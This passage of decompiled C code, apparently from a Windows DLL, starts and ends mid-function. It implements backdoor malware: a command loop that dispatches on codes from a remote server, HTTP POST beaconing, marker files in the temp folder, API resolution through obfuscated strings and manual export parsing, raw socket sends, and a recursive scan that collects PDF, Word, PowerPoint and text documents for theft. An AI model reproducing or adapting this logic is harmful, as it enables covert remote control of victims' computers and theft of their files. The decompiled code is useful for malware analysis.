        int32_t v48 = v31 - 56; // 0x10008a9f
        int32_t * v49 = (int32_t *)v48; // 0x10008a9f
        *v49 = (int32_t)((0x100000000 * (int64_t)(v46 >> 31) | (int64_t)v46) % 0x7a120);
        int32_t * v50 = (int32_t *)(v31 - 60); // 0x10008aa6
        *v50 = 0x7a120 * v22 + lpString;
        int32_t * v51 = (int32_t *)(v31 - 64); // 0x10008aa7
        *v51 = v47;
        function_1000c0f0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
        *v49 = lpString;
        int32_t v52 = lstrlenA((char *)&g161); // 0x10008ab6
        *v50 = a3;
        *v51 = a1;
        *(int32_t *)(v31 - 68) = v24;
        *(char *)(v47 + (int32_t)((0x100000000 * (int64_t)(v52 >> 31) | (int64_t)v52) % 0x7a120)) = 0;
        *(int32_t *)(v31 - 72) = v26;
        function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161);
        v42 = v44;
        v43 = v48;
    }
    // 0x10008af7
    GetTickCount();
    function_10008420();
    *(int32_t *)(v43 - 8) = v16;
    lstrcpyA((char *)&g161, (char *)&g161);
    *(int32_t *)(v43 - 16) = v16;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v43 - 20) = (int32_t)"&zz";
    *(int32_t *)(v43 - 24) = v16;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v43 - 28) = v42;
    *(int32_t *)(v43 - 32) = v16;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v43 - 36) = (int32_t)"=1";
    *(int32_t *)(v43 - 40) = v16;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v43 - 44) = v16;
    lstrlenA((char *)&g161);
    int32_t * v53 = (int32_t *)(v43 - 48); // 0x10008b38
    *v53 = a3;
    int32_t * v54 = (int32_t *)(v43 - 52); // 0x10008b43
    *v54 = a1;
    int32_t * v55 = (int32_t *)(v43 - 56); // 0x10008b4f
    *v55 = v24;
    int32_t * v56 = (int32_t *)(v43 - 60); // 0x10008b56
    *v56 = v26;
    function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161);
    int32_t v57; // bp-1724, 0x100084b0
    int32_t v58 = &v57; // 0x10008b65
    *v53 = v58;
    *v54 = 1000;
    GetTempPathA((int32_t)&g161, (char *)&g161);
    lpString1_ = (char *)0x30325954;
    int32_t v59 = (int32_t)&lpString1_; // 0x10008b7b
    *v55 = v59;
    *v56 = v58;
    lstrcatA(lpString1_, (char *)0x7461642e);
    *(int32_t *)(v43 - 64) = v59;
    int32_t v60 = v43 - 68; // 0x10008b9a
    *(int32_t *)v60 = a2;
    lpString1_ = (char *)0x30315954;
    v17 = 0x34585054;
    v18 = (char *)0x34585054;
    int32_t v61 = v60; // 0x10008be5
    if (StrStrA((char *)0x34585054, (char *)0x642e3939) == NULL) {
        // 0x10008be7
        *(int32_t *)(v43 - 72) = (int32_t)&v17;
        int32_t v62 = v43 - 76; // 0x10008bf1
        *(int32_t *)v62 = a2;
        char * v63 = StrStrIA((char *)&g161, (char *)&g161); // 0x10008bf2
        v61 = v62;
        if (v63 == NULL) {
            // 0x10008bf8
            *(int32_t *)(v43 - 80) = (int32_t)&v18;
            int32_t v64 = v43 - 84; // 0x10008bfc
            *(int32_t *)v64 = a2;
            char * v65 = StrStrIA((char *)&g161, (char *)&g161); // 0x10008bfd
            v61 = v64;
            if (v65 == NULL) {
                int32_t v66 = (int32_t)v65; // 0x10008bfd
                *(int32_t *)(v43 - 88) = v66;
                *(int32_t *)(v43 - 92) = 128;
                *(int32_t *)(v43 - 96) = 2;
                *(int32_t *)(v43 - 100) = v66;
                *(int32_t *)(v43 - 104) = v66;
                *(int32_t *)(v43 - 108) = 0x40000000;
                *(int32_t *)(v43 - 112) = v58;
                int32_t * fileHandle2 = CreateFileA((char *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x10008c19
                int32_t v67 = (int32_t)fileHandle2; // 0x10008c19
                *(int32_t *)(v43 - 116) = 0;
                int32_t v68; // bp-10772, 0x100084b0
                *(int32_t *)(v43 - 120) = (int32_t)&v68;
                *(int32_t *)(v43 - 124) = a2;
                *(int32_t *)(v43 - 128) = lstrlenA((char *)&g161);
                *(int32_t *)(v43 - 132) = a2;
                *(int32_t *)(v43 - 136) = v67;
                WriteFile(&g161, &g161, (int32_t)&g161, &g161, (struct _OVERLAPPED *)&g161);
                int32_t v69 = v43 - 140; // 0x10008c3a
                *(int32_t *)v69 = v67;
                CloseHandle(&g161);
                v61 = v69;
            }
        }
    }
    // 0x10008c41
    *(int32_t *)(v61 - 4) = lpString;
    LocalFree(&g161);
    *(int32_t *)(v61 - 8) = v16;
    LocalFree(&g161);
    *(int32_t *)(v61 - 12) = g139;
    // 0x10008c5e
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10008c80 - 0x10008d15
int32_t function_10008c80(int32_t a1) {
    // 0x10008c80
    int32_t lpBuffer; // bp-1016, 0x10008c80
    GetTempPathA(1000, (char *)&lpBuffer);
    lstrcatA((char *)&lpBuffer, "TY10.dat");
    CloseHandle(CreateFileA((char *)&lpBuffer, 0x40000000, 0, NULL, 2, 128, NULL));
    int32_t v1; // 0x10008c80
    function_100084b0(a1 + 0x1770, v1, (int32_t)&lpBuffer);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x10008d20 - 0x10009460
int32_t function_10008d20(int32_t a1, int32_t a2) {
    // 0x10008d20
    int32_t v1; // bp-4, 0x10008d20
    int32_t v2 = &v1; // 0x10008d21
    __chkstk();
    int128_t v3; // 0x10008d20
    __asm_movdqu(v3, __asm_movdqa_9(g40));
    int128_t v4; // 0x10008d20
    __asm_movdqu(v4, __asm_movdqa_9(g33));
    int128_t v5; // 0x10008d20
    __asm_movdqu(v5, __asm_movdqa_9(0x77772d782f6e6f69746163696c707061));
    int32_t v6 = a2; // bp-47732, 0x10008d8a
    int128_t v7; // 0x10008d20
    __asm_movdqu(v7, __asm_movdqa_9(g53));
    int128_t v8; // 0x10008d20
    __asm_movdqu(v8, __asm_movdqa_9(0x74676e654c2d746e65746e6f430a0d64));
    _memset((int32_t *)0x203a68, (int32_t)&g161, (int32_t)&g161);
    GetModuleHandleA((char *)0x6e72656b);
    char * lpString1 = (char *)0x64616f4c; // bp-120, 0x10008dff
    g137 = function_100058f0();
    int32_t lpString = function_100058f0(); // 0x10008e34
    int32_t lpString2 = lstrlenA((char *)lpString); // 0x10008e46
    int32_t v9; // bp-32, 0x10008d20
    int32_t v10 = &v9; // 0x10008e4c
    int32_t v11 = lpString; // bp-47724, 0x10008e63
    int32_t v12 = v10; // 0x10008e63
    int32_t v13; // 0x10008d20
    int32_t v14; // 0x10008d20
    int32_t v15; // 0x10008d20
    if (lstrlenA((char *)lpString2) >= 1) {
        // 0x10008e69
        v11 = lpString;
        int32_t v16; // 0x10008d20
        int32_t v17 = v16 + 1;
        int32_t v18 = v2 - 860;
        v15 = v10;
        v13 = 0;
        while (true) {
          lab_0x10008e70:;
            int32_t v19 = v13;
            int32_t v20 = v19 + v16;
            char v21 = *(char *)v20; // 0x10008e70
            if (v21 != 46) {
                // 0x10008edb
                *(char *)(v18 + v19) = v21;
                v14 = v19;
                goto lab_0x10008ee2;
            } else {
                char * v22 = (char *)(v19 + v17); // 0x10008e77
                if (*v22 != 112) {
                    // 0x10008edb
                    *(char *)(v18 + v19) = v21;
                    v14 = v19;
                    goto lab_0x10008ee2;
                } else {
                    char * v23 = (char *)(v20 + 2); // 0x10008e7e
                    if (*v23 != 104) {
                        // 0x10008edb
                        *(char *)(v18 + v19) = v21;
                        v14 = v19;
                        goto lab_0x10008ee2;
                    } else {
                        char * v24 = (char *)(v20 + 3); // 0x10008e85
                        if (*v24 != 112) {
                            // 0x10008edb
                            *(char *)(v18 + v19) = v21;
                            v14 = v19;
                            goto lab_0x10008ee2;
                        } else {
                            // 0x10008e8c
                            *(char *)(v19 + v18) = v21;
                            int32_t v25 = v19 + v2;
                            *(char *)(v25 - 859) = *v22;
                            *(char *)(v25 - 858) = *v23;
                            *(char *)(v25 - 857) = *v24;
                            int32_t v26 = v19 + 4; // 0x10008eb7
                            if (v26 >= 400) {
                                goto lab_0x1000944b;
                            }
                            // 0x10008ec6
                            *(char *)(v26 + v18) = 0;
                            v11 = v26 + v17;
                            v14 = v26;
                            goto lab_0x10008ee2;
                        }
                    }
                }
            }
        }
      lab_0x10008eee:;
    }
    // 0x10008ef4
    *(int32_t *)(v12 - 4) = v11;
    int32_t v27; // bp-1664, 0x10008d20
    int32_t v28 = &v27; // 0x10008f01
    *(int32_t *)(v12 - 8) = v28;
    lstrcpyA((char *)&g161, (char *)&g161);
    int32_t v29; // bp-1264, 0x10008d20
    int32_t v30 = &v29; // 0x10008f0a
    *(int32_t *)(v12 - 12) = v30;
    *(int32_t *)(v12 - 16) = 200;
    GetTempPathW((int32_t)&g161, (int16_t *)&g161);
    *(int32_t *)(v12 - 20) = (int32_t)L"up";
    *(int32_t *)(v12 - 24) = v30;
    lstrcatW((int16_t *)&g161, (int16_t *)&g161);
    int32_t v31; // bp-3712, 0x10008d20
    int32_t v32 = &v31; // 0x10008f2f
    *(int32_t *)(v12 - 32) = v32;
    lstrcpyA((char *)&g161, (char *)&g161);
    int32_t v33 = v12 - 40; // 0x10008f3f
    *(int32_t *)v33 = v32;
    lstrcatA((char *)&g161, (char *)&g161);
    int32_t * v34 = (int32_t *)(v12 - 48); // 0x10008f4b
    *v34 = a1;
    int32_t * v35 = (int32_t *)(v12 - 52); // 0x10008f57
    int32_t v36 = &v11; // 0x10008f57
    *v35 = v36;
    int32_t v37 = v12 - 56; // 0x10008f5e
    int32_t * v38 = (int32_t *)v37; // 0x10008f5e
    int32_t v39; // bp-47712, 0x10008d20
    int32_t v40 = &v39; // 0x10008f5e
    *v38 = v40;
    int32_t v41 = function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161); // 0x10008f65
    if (v41 == 0) {
        // 0x10008f71
        return _40___security_check_cookie_40_4();
    }
    int32_t v42 = v12 - 44; // 0x10008f42
    int32_t * v43 = (int32_t *)v42; // 0x10008f42
    int32_t v44; // 0x10008d20
    int32_t v45; // 0x10008d20
    int32_t v46; // 0x10008d20
    int32_t v47; // 0x10008d20
    int32_t v48; // 0x10008d20
    if (v11 < 4) {
        // 0x1000934b
        *v43 = (int32_t)"POST ";
        *v34 = v32;
        lstrcpyA((char *)&g161, (char *)&g161);
        int32_t v49; // bp-864, 0x10008d20
        *v35 = (int32_t)&v49;
        *v38 = v32;
        lstrcatA((char *)&g161, (char *)&g161);
        int128_t v50; // bp-360, 0x10008d20
        *(int32_t *)(v12 - 60) = (int32_t)&v50;
        *(int32_t *)(v12 - 64) = v32;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v12 - 72) = v32;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v12 - 76) = v28;
        int32_t v51 = lstrlenA((char *)&g161); // 0x10009393
        function_10008420();
        int128_t v52; // bp-328, 0x10008d20
        *(int32_t *)(v12 - 80) = (int32_t)&v52;
        *(int32_t *)(v12 - 84) = v32;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v12 - 88) = a1;
        *(int32_t *)(v12 - 92) = v32;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v12 - 96) = v28;
        int32_t v53 = v12 - 100;
        *(int32_t *)v53 = v32;
        lstrcatA((char *)&g161, (char *)&g161);
        *(int32_t *)(v12 - 104) = v51;
        *(int32_t *)(v12 - 108) = v30;
        int32_t v54; // 0x10008d20
        *(int32_t *)(v12 - 112) = v54 != 0 ? v54 : 0;
        *(int32_t *)(v12 - 120) = v6;
        int32_t v55 = function_10006ad0((int32_t)&g161); // 0x10009429
        v45 = v53;
        v46 = v55;
        goto lab_0x10009041;
    } else {
        if (v11 != 4) {
            int32_t v56; // bp-5712, 0x10008d20
            if (v11 != 5) {
                if (v11 != 6) {
                    int32_t v57; // bp-4712, 0x10008d20
                    if (v11 != 7) {
                        int32_t v58; // bp-27712, 0x10008d20
                        if (v11 != 8) {
                            if (v11 != 9) {
                                // 0x1000931c
                                v45 = v33;
                                v46 = 1;
                                if (v11 == 10) {
                                    // 0x10009325
                                    *v43 = (int32_t)&v58;
                                    *v35 = v32;
                                    *v38 = a1;
                                    function_10002d90((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
                                    v45 = v33;
                                    v46 = 1;
                                }
                            } else {
                                // 0x100092ca
                                g138 = 1;
                                int32_t v59 = &v57; // 0x100092da
                                *v43 = v59;
                                *v34 = 1000;
                                GetTempPathA((int32_t)&g161, (char *)&g161);
                                *v35 = (int32_t)"DMCZ0001.dat";
                                *v38 = v59;
                                lstrcatA((char *)&g161, (char *)&g161);
                                *(int32_t *)(v12 - 60) = 0;
                                *(int32_t *)(v12 - 64) = 0;
                                *(int32_t *)(v12 - 68) = 2;
                                *(int32_t *)(v12 - 72) = 0;
                                *(int32_t *)(v12 - 76) = 7;
                                *(int32_t *)(v12 - 80) = 0x40000000;
                                *(int32_t *)(v12 - 84) = v59;
                                int32_t * fileHandle = CreateFileA((char *)&g161, (int32_t)&g161, (int32_t)&g161, (struct _SECURITY_ATTRIBUTES *)&g161, (int32_t)&g161, (int32_t)&g161, &g161); // 0x1000930a
                                int32_t v60 = v12 - 88; // 0x10009310
                                *(int32_t *)v60 = (int32_t)fileHandle;
                                CloseHandle(&g161);
                                v45 = v60;
                                v46 = 1;
                            }
                            goto lab_0x10009041;
                        } else {
                            // 0x100092b8
                            *v43 = 1;
                            v48 = &v58;
                            v44 = v32;
                            v47 = v42;
                            goto lab_0x100091ed;
                        }
                    } else {
                        // 0x10009213
                        *v43 = 0x18a0;
                        *v34 = 64;
                        int32_t memoryHandle = (int32_t)LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x1000921a
                        *v38 = memoryHandle;
                        lstrcpyA((char *)&g161, (char *)&g161);
                        *(int32_t *)(v12 - 64) = memoryHandle + 3000;
                        lstrcpyA((char *)&g161, (char *)&g161);
                        *(int32_t *)(v12 - 68) = a1;
                        int32_t v61 = memoryHandle + 0x1770; // 0x10009241
                        *(int32_t *)(v12 - 72) = v61;
                        lstrcpyA((char *)&g161, (char *)&g161);
                        *(int32_t *)(v12 - 76) = a1;
                        *(int32_t *)(v12 - 80) = v61;
                        lstrcpyA((char *)&g161, (char *)&g161);
                        int32_t v62 = &v57; // 0x1000926a
                        *(int32_t *)(v12 - 84) = v62;
                        *(int32_t *)(v12 - 88) = 1000;
                        GetTempPathA((int32_t)&g161, (char *)&g161);
                        *(int32_t *)(v12 - 92) = (int32_t)"DMCZ0001.dat";
                        *(int32_t *)(v12 - 96) = v62;
                        lstrcatA((char *)&g161, (char *)&g161);
                        *(int32_t *)(v12 - 100) = v62;
                        DeleteFileA((char *)&g161);
                        *(int32_t *)(v12 - 104) = (int32_t)&v6;
                        *(int32_t *)(v12 - 108) = 0;
                        *(int32_t *)(v12 - 112) = memoryHandle;
                        *(int32_t *)(v12 - 116) = 0x1000a690;
                        *(int32_t *)(v12 - 120) = 0;
                        int32_t v63 = v12 - 124; // 0x100092a6
                        *(int32_t *)v63 = 0;
                        v45 = v63;
                        v46 = 1;
                        goto lab_0x10009041;
                    }
                } else {
                    // 0x1000914c
                    v45 = v33;
                    v46 = 1;
                    if (g126 != 0) {
                        goto lab_0x10009041;
                    } else {
                        // 0x10009159
                        int32_t v64; // bp-7712, 0x10008d20
                        int32_t v65 = &v64; // 0x1000915f
                        *v43 = v65;
                        *v34 = 260;
                        GetTempPathW((int32_t)&g161, (int16_t *)&g161);
                        int128_t v66 = __asm_movdqa_9(g29); // 0x1000916b
                        int128_t v67; // bp-464, 0x10008d20
                        *v35 = (int32_t)&v67;
                        *v38 = v65;
                        __asm_movdqu(0, v66);
                        lstrcatW(NULL, (int16_t *)&g161);
                        int32_t v68 = &v56;
                        *(int32_t *)(v12 - 60) = v68;
                        *(int32_t *)(v12 - 64) = 260;
                        GetTempPathA((int32_t)&g161, (char *)&g161);
                        lpString1 = (char *)0x34585054;
                        *(int32_t *)(v12 - 68) = (int32_t)&lpString1;
                        *(int32_t *)(v12 - 72) = v68;
                        lstrcatA(lpString1, (char *)0x642e3939);
                        function_10001530();
                        v48 = v68;
                        v44 = v65;
                        v47 = v12 - 76;
                        goto lab_0x100091ed;
                    }
                }
            } else {
                // 0x100090cf
                v45 = v33;
                v46 = 1;
                if (g126 == 0) {
                    int32_t v69 = &v56; // 0x100090e2
                    *v43 = v69;
                    *v34 = 260;
                    GetTempPathA((int32_t)&g161, (char *)&g161);
                    lpString1 = (char *)0x34585054;
                    *v35 = (int32_t)&lpString1;
                    *v38 = v69;
                    lstrcatA(lpString1, (char *)0x642e3839);
                    *(int32_t *)(v12 - 64) = v69;
                    *(int32_t *)(v12 - 68) = v32;
                    *(int32_t *)(v12 - 72) = a1;
                    function_100084b0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
                    g129 = 1;
                    v45 = v37;
                    v46 = 1;
                }
                goto lab_0x10009041;
            }
        } else {
            // 0x10008fb9
            v45 = v33;
            v46 = 1;
            if (g148 == 0) {
                // 0x10008fc2
                *v43 = 0x18a0;
                *v34 = 64;
                int32_t memoryHandle2 = (int32_t)LocalAlloc((int32_t)&g161, (int32_t)&g161); // 0x10008fc9
                *v38 = memoryHandle2;
                lstrcpyA((char *)&g161, (char *)&g161);
                *(int32_t *)(v12 - 64) = memoryHandle2 + 3000;
                lstrcpyA((char *)&g161, (char *)&g161);
                *(int32_t *)(v12 - 68) = a1;
                int32_t v70 = memoryHandle2 + 0x1770; // 0x10008ff0
                *(int32_t *)(v12 - 72) = v70;
                lstrcpyA((char *)&g161, (char *)&g161);
                *(int32_t *)(v12 - 76) = a1;
                *(int32_t *)(v12 - 80) = v70;
                lstrcpyA((char *)&g161, (char *)&g161);
                *(int32_t *)(v12 - 84) = (int32_t)&v6;
                *(int32_t *)(v12 - 88) = 0;
                *(int32_t *)(v12 - 92) = memoryHandle2;
                *(int32_t *)(v12 - 96) = 0x10008c80;
                *(int32_t *)(v12 - 100) = 0;
                int32_t v71 = v12 - 104; // 0x10009024
                *(int32_t *)v71 = 0;
                g148 = 1;
                v45 = v71;
                v46 = 1;
            }
            goto lab_0x10009041;
        }
    }
  lab_0x10008ee2:
    // 0x10008ee2
    v12 = v15 - 4;
    int32_t v72 = v14 + 1; // 0x10008ee3
    uint32_t v73 = lstrlenA((char *)&g161); // 0x10008ee4
    v15 = v12;
    v13 = v72;
    if (v72 >= v73) {
        // break -> 0x10008eee
        goto lab_0x10008eee;
    }
    goto lab_0x10008e70;
  lab_0x10009041:
    // 0x10009041
    *(int32_t *)(v45 - 8) = v32;
    lstrcpyA((char *)&g161, (char *)&g161);
    *(int32_t *)(v45 - 16) = v32;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v45 - 20) = (int32_t)"&r=1";
    *(int32_t *)(v45 - 24) = v32;
    lstrcatA((char *)&g161, (char *)&g161);
    int32_t * v74 = (int32_t *)(v45 - 32); // 0x10009075
    *v74 = a1;
    *(int32_t *)(v45 - 36) = v36;
    *(int32_t *)(v45 - 40) = v40;
    function_10007880((int32_t)&g161, (int32_t)&g161, (char)&g161, (int32_t)&g161);
    uint32_t v75 = lstrlenA((char *)&g161) - 4; // 0x100090a3
    if (v75 >= 2048) {
      lab_0x1000944b:
        // 0x1000944b
        function_1000b43d();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        __asm_int3();
        return __asm_int3();
    }
    // 0x100090b1
    *(char *)(v2 - 3708 + v75) = 0;
    if (v46 != -1) {
        // 0x10009438
        return _40___security_check_cookie_40_4();
    }
    // 0x100090c2
    *v74 = 1;
    ExitProcess((int32_t)&g161);
    // UNREACHABLE
  lab_0x100091ed:
    // 0x100091ed
    *(int32_t *)(v47 - 4) = v48;
    *(int32_t *)(v47 - 8) = v44;
    *(int32_t *)(v47 - 12) = a1;
    function_100084b0((int32_t)&g161, (int32_t)&g161, (int32_t)&g161);
    v45 = v47 + 4;
    v46 = 1;
    goto lab_0x10009041;
}

// Address range: 0x10009460 - 0x100096be
int32_t function_10009460(void) {
    struct in_addr in; // 0x10009610
    // 0x10009460
    int32_t v1; // bp-383, 0x10009460
    _memset(&v1, 0, 99);
    int32_t v2; // bp-279, 0x10009460
    _memset(&v2, 0, 259);
    int32_t moduleHandle = (int32_t)GetModuleHandleA("kernel32.dll"); // 0x100094bc
    int32_t lpString1 = 0x64616f4c; // bp-388, 0x100094c4
    int32_t v3 = *(int32_t *)(moduleHandle + 120 + *(int32_t *)(moduleHandle + 60)) + moduleHandle; // 0x100094ec
    int32_t v4 = function_10007210(moduleHandle, (char *)&lpString1); // 0x100094f8
    uint16_t v5 = *(int16_t *)(2 * v4 + moduleHandle + *(int32_t *)(v3 + 36)); // 0x10009506
    int32_t v6 = *(int32_t *)(*(int32_t *)(v3 + 28) + moduleHandle + 4 * (int32_t)v5); // 0x10009515
    g137 = v6 + moduleHandle;
    lstrcpyA((char *)&lpString1, "dpoofdu");
    int32_t v7 = 0x5f327357; // bp-292, 0x1000954e
    function_10007210((int32_t)&v7, "connect");
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // 0x100095b9
    if (sock_fd == -1) {
        // 0x100095c6
        return _40___security_check_cookie_40_4();
    }
    // 0x100095de
    int128_t v8; // 0x10009460
    int64_t v9; // 0x10009460
    __asm_movq_10(v9, __asm_xorps(v8, v8));
    struct hostent * v10 = gethostbyname(NULL); // 0x100095fc
    int32_t v11; // bp-468, 0x10009460
    int32_t * v12; // 0x10009460
    if (v10 != NULL) {
        int32_t v13 = *(int32_t *)*(int32_t *)((int32_t)v10 + 12); // 0x1000960c
        int32_t v14 = *(int32_t *)v13; // 0x1000960e
        v11 = v14;
        in = (struct {int32_t e0;}){
            .e0 = 0
        };
        in.e0 = v14;
        int32_t v15 = (int32_t)inet_ntoa(in); // bp-472, 0x10009616
        v12 = &v15;
    } else {
        // 0x10009606
        v11 = &lpString1;
        v12 = &v11;
    }
    int32_t v16 = (int32_t)v12;
    *(int32_t *)(v16 + 36) = inet_addr((char *)&g161);
    *(int32_t *)(v16 - 4) = 80;
    *(int16_t *)(v16 + 32) = 2;
    int16_t v17 = htons((int16_t)&g161); // 0x1000962d
    *(int32_t *)(v16 - 8) = 8;
    *(int16_t *)(v16 + 30) = v17;
    int32_t v18 = v16 + 20; // 0x1000963c
    *(int32_t *)v18 = 0xafc8;
    *(int32_t *)(v16 - 12) = v18;
    int32_t * v19 = (int32_t *)(v16 - 16); // 0x10009649
    *v19 = 0x1006;
    *(int32_t *)(v16 - 20) = 0xffff;
    *(int32_t *)(v16 - 24) = sock_fd;
    *(int32_t *)(v16 + 24) = 0;
    setsockopt((int32_t)&g161, (int32_t)&g161, (int32_t)&g161, (char *)&g161, (int32_t)&g161);
    *(int32_t *)(v16 - 28) = 16;
    *(int32_t *)(v16 - 32) = v16 + 8;
    *(int32_t *)(v16 - 36) = sock_fd;
    int32_t v20 = *v19; // 0x10009689
    *(int32_t *)(v16 - 40) = 0;
    *(int32_t *)(v16 - 44) = v20;
    *(int32_t *)(v16 - 48) = lstrlenA((char *)&g161);
    *(int32_t *)(v16 - 52) = v20;
    *(int32_t *)(v16 - 56) = sock_fd;
    send((int32_t)&g161, (char *)&g161, (int32_t)&g161, (int32_t)&g161);
    return _40___security_check_cookie_40_4();
}

// Address range: 0x100096c0 - 0x10009968
int32_t function_100096c0(void) {
    // 0x100096c0
    int32_t lpString1; // bp-516, 0x100096c0
    int32_t lpString2; // 0x100096c0
    lstrcpyA((char *)&lpString1, (char *)lpString2);
    lstrcatA((char *)&lpString1, "\\*");
    char * v1 = (char *)&lpString1; // bp-1892, 0x1000970d
    char lpFindFileData; // bp-1836, 0x100096c0
    int32_t * v2 = FindFirstFileA((char *)&lpString1, (struct _WIN32_FIND_DATAA *)&lpFindFileData); // 0x1000970e
    if (v2 == (int32_t *)-1) {
        // 0x10009957
        return _40___security_check_cookie_40_4();
    }
    int32_t v3 = (int32_t)v2; // 0x1000970e
    int32_t v4 = &lpString1;
    char v5; // bp-1792, 0x100096c0
    int32_t v6 = &v5;
    int32_t v7; // bp-1516, 0x100096c0
    int32_t v8 = &v7;
    char * v9; // bp-1844, 0x100096c0
    int32_t v10 = (int32_t)&v9;
    int32_t v11 = (int32_t)&v1; // 0x10009729
    int32_t v12; // 0x100096c0
    int32_t v13; // 0x100096c0
    int32_t v14; // 0x100096c0
    while (true) {
      lab_0x10009730:;
        int32_t v15 = v11;
        if ((lpFindFileData & 16) == 0) {
            // 0x10009791
            *(int32_t *)(v15 - 8) = v4;
            lstrcpyA((char *)&g161, (char *)&g161);
            *(int32_t *)(v15 - 12) = (int32_t)&g17;
            *(int32_t *)(v15 - 16) = v4;
            lstrcatA((char *)&g161, (char *)&g161);
            *(int32_t *)(v15 - 20) = v6;
            *(int32_t *)(v15 - 24) = v4;
            lstrcatA((char *)&g161, (char *)&g161);
            int32_t v16; // bp-1852, 0x100096c0
            *(int32_t *)(v15 - 28) = (int32_t)&v16;
            int32_t v17 = v15 - 32; // 0x100097ca
            *(int32_t *)v17 = v4;
            uint32_t v18 = GetCompressedFileSizeA((char *)&g161, &g161); // 0x100097cb
            v9 = (char *)v18;
            v13 = v17;
            if (v18 >= 0xf00000) {
                goto lab_0x100098b7;
            } else {
                // 0x100097e2
                *(int32_t *)(v15 - 36) = (int32_t)".pdf";
                *(int32_t *)(v15 - 40) = v6;
                if (StrStrIA(v9, (char *)&g161) != NULL) {
                    goto lab_0x1000984e;
                } else {
                    // 0x100097f4
                    *(int32_t *)(v15 - 44) = (int32_t)".doc";
                    int32_t v19 = v15 - 48; // 0x100097ff
                    *(int32_t *)v19 = v6;
                    char * v20 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009800
                    v12 = v19;
                    if (v20 != NULL) {
                        goto lab_0x1000984e;
                    } else {
                        // 0x10009806
                        *(int32_t *)(v15 - 52) = (int32_t)".docx";
                        int32_t v21 = v15 - 56; // 0x10009811
                        *(int32_t *)v21 = v6;
                        char * v22 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009812
                        v12 = v21;
                        if (v22 != NULL) {
                            goto lab_0x1000984e;
                        } else {
                            // 0x10009818
                            *(int32_t *)(v15 - 60) = (int32_t)".ppt";
                            int32_t v23 = v15 - 64; // 0x10009823
                            *(int32_t *)v23 = v6;
                            char * v24 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009824
                            v12 = v23;
                            if (v24 != NULL) {
                                goto lab_0x1000984e;
                            } else {
                                // 0x1000982a
                                *(int32_t *)(v15 - 68) = (int32_t)".pptx";
                                int32_t v25 = v15 - 72; // 0x10009835
                                *(int32_t *)v25 = v6;
                                char * v26 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009836
                                v12 = v25;
                                if (v26 != NULL) {
                                    goto lab_0x1000984e;
                                } else {
                                    // 0x1000983c
                                    *(int32_t *)(v15 - 76) = (int32_t)".txt";
                                    int32_t v27 = v15 - 80; // 0x10009847
                                    *(int32_t *)v27 = v6;
                                    char * v28 = StrStrIA((char *)&g161, (char *)&g161); // 0x10009848
                                    v12 = v27;
                                    v13 = v27;
                                    if (v28 == NULL) {
                                        goto lab_0x100098b7;
                                    } else {
                                        goto lab_0x1000984e;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        } else {
            // 0x1000973a
            v14 = v15;
            if (v5 != 46) {
                // 0x10009747
                v14 = v15;
                if ((lpFindFileData & 2) == 0) {
                    // 0x1000974f
                    *(int32_t *)(v15 - 8) = v4;
                    lstrcpyA((char *)&g161, (char *)&g161);
                    *(int32_t *)(v15 - 12) = (int32_t)&g16;
                    *(int32_t *)(v15 - 16) = v4;
                    lstrcatA((char *)&g161, (char *)&g161);
                    *(int32_t *)(v15 - 20) = v6;
                    int32_t v29 = v15 - 24; // 0x10009778
                    *(int32_t *)v29 = v4;
                    lstrcatA((char *)&g161, (char *)&g161);
                    function_100096c0();
                    v14 = v29;
                }
            }
            goto lab_0x1000992a;
        }
    }
  lab_0x10009945:
    // 0x10009945
    GetLastError();
    int32_t v30; // 0x100096c0
    *(int32_t *)(v30 - 12) = v3;
    FindClose(&g161);
    // 0x10009957
    return _40___security_check_cookie_40_4();
  lab_0x100098b7:
    // 0x100098b7
    *(int32_t *)(v13 - 4) = (int32_t)"HUGE:";
    *(int32_t *)(v13 - 8) = v8;
    lstrcpyA((char *)&g161, (char *)&g161);
    *(int32_t *)(v13 - 16) = v8;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v13 - 20) = (int32_t)&g20;
    *(int32_t *)(v13 - 24) = v8;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v13 - 28) = v6;
    *(int32_t *)(v13 - 32) = v8;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v13 - 36) = (int32_t)"::size crosses 10 MB";
    *(int32_t *)(v13 - 40) = v8;
    lstrcatA((char *)&g161, (char *)&g161);
    *(int32_t *)(v13 - 44) = 0;
    *(int32_t *)(v13 - 48) = v10;
    *(int32_t *)(v13 - 52) = v8;
    *(int32_t *)(v13 - 56) = lstrlenA((char *)&g161) + 1;
    int32_t v31 = v13 - 60; // 0x1000991d
    *(int32_t *)v31 = v8;
    int32_t v32 = v31; // 0x1000991d
